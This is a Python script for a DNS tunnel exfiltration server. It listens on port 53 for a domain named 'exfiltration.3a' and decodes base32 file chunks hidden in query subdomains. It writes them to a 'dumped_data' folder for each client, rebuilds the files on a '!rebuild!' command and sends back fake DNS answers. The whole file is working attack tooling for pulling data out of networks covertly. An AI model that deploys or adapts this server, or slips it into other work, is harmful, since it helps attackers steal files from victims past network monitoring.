import os
import socket
import base64

LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 53
TARGET_DOMAIN = 'exfiltration.3a'

def fix_b32_padding(s: str) -> str:
    return s + "=" * ((8 - len(s) % 8) % 8)

def extract_labels(data):
    labels = []
    i = 12  # DNS header offset
    length = data[i]
    while length != 0:
        labels.append(data[i+1:i+1+length].decode())
        i += length + 1
        length = data[i]
    return labels, i + 1

def build_response(data, end_offset):
    transaction_id = data[:2]
    flags = b'\x81\x80'  # Standard DNS response flags
    qdcount = b'\x00\x01'
    ancount = b'\x00\x01'
    nscount = arcount = b'\x00\x00'
    header = transaction_id + flags + qdcount + ancount + nscount + arcount
    question = data[12:end_offset + 4]

    # Minimal fake A record answer
    name = b'\xc0\x0c'  # Pointer to question name
    type_ = b'\x00\x01' # A record
    class_ = b'\x00\x01' # IN class
    ttl = b'\x00\x00\x00\x3c' # TTL
    rdlength = b'\x00\x04'
    rdata = socket.inet_aton('10.0.0.1')
    answer = name + type_ + class_ + ttl + rdlength + rdata

    return header + question + answer

def save_chunk_to_disk(client_ip, filename, chunk_index, chunk_data_b64):
    chunk_dir = os.path.join("dumped_data", client_ip, "chunks", filename)
    os.makedirs(chunk_dir, exist_ok=True)

    chunk_filename = f"chunk{chunk_index:05d}.b64"
    chunk_path = os.path.join(chunk_dir, chunk_filename)

    with open(chunk_path, 'w') as f:
        f.write(chunk_data_b64)

    print(f"[+] Saved chunk {chunk_index} for '{filename}' from {client_ip}")

def reconstruct_file(client_ip, filename):
    chunk_dir = os.path.join("dumped_data", client_ip, "chunks", filename)
    if not os.path.exists(chunk_dir):
        print(f"[!] No chunk directory for {filename} from {client_ip}")
        return

    chunks = []
    for fname in os.listdir(chunk_dir):
        if fname.startswith("chunk") and fname.endswith(".b64"):
            try:
                idx = int(fname[5:10])
                path = os.path.join(chunk_dir, fname)
                chunks.append((idx, path))
            except Exception:
                continue

    if not chunks:
        print(f"[!] No chunks found for {filename}")
        return

    chunks.sort(key=lambda x: x[0])
    full_b64 = ""
    for _, path in chunks:
        with open(path, 'r') as f:
            full_b64 += f.read().strip()

    try:
        decoded = base64.b64decode(full_b64)
    except Exception as e:
        print(f"[!] Failed to decode base64 for {filename}: {e}")
        return

    final_path = os.path.join("dumped_data", client_ip, filename)
    with open(final_path, 'wb') as f:
        f.write(decoded)

    print(f"[+] Reconstructed file saved: {final_path}")

    for _, path in chunks:
        os.remove(path)
    print(f"[+] Deleted {len(chunks)} chunk files")

def process_payload(payload, client_ip):
    if payload.strip() == "!rebuild!":
        print(f"[+] Rebuild command received from {client_ip}")
        client_dir = os.path.join("dumped_data", client_ip, "chunks")
        if not os.path.exists(client_dir):
            print(f"[!] No data to rebuild for {client_ip}")
            return

        for filename in os.listdir(client_dir):
            reconstruct_file(client_ip, filename)
        return

    try:
        filename, chunk_index_str, chunk_data_b64 = payload.split("|--", 2)
        chunk_index = int(chunk_index_str)
    except Exception:
        print(f"[!] Invalid payload format from {client_ip}: {payload}")
        return

    save_chunk_to_disk(client_ip, filename, chunk_index, chunk_data_b64)

def start_dns_tunnel():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((LISTEN_IP, LISTEN_PORT))
    except PermissionError:
        print("[X] Permission denied. Run this script as root (or bind to a higher port).")
        return

    print(f"[+] DNS tunnel server listening on {LISTEN_IP}:{LISTEN_PORT} for domain: {TARGET_DOMAIN}")

    while True:
        try:
            data, addr = sock.recvfrom(512)
            client_ip = addr[0]
            labels, end_offset = extract_labels(data)
            if labels and '.'.join(labels[-2:]) == TARGET_DOMAIN:
                encoded = ''.join(labels[:-2])
                try:
                    decoded_bytes = base64.b32decode(fix_b32_padding(encoded.upper()))
                    payload_str = decoded_bytes.decode('utf-8', errors='ignore')
                    process_payload(payload_str, client_ip)
                except Exception as e:
                    print(f"[!] Failed to decode/process payload from {client_ip}: {e}")
            else:
                print(f"[?] Ignored non-target query from {client_ip}: {'.'.join(labels)}")

            response = build_response(data, end_offset)
            sock.sendto(response, addr)

        except KeyboardInterrupt:
            print("\n[!] Server stopped by user.")
            break
        except Exception as e:
            print(f"[!] Unexpected error: {e}")

if __name__ == '__main__':
    start_dns_tunnel()
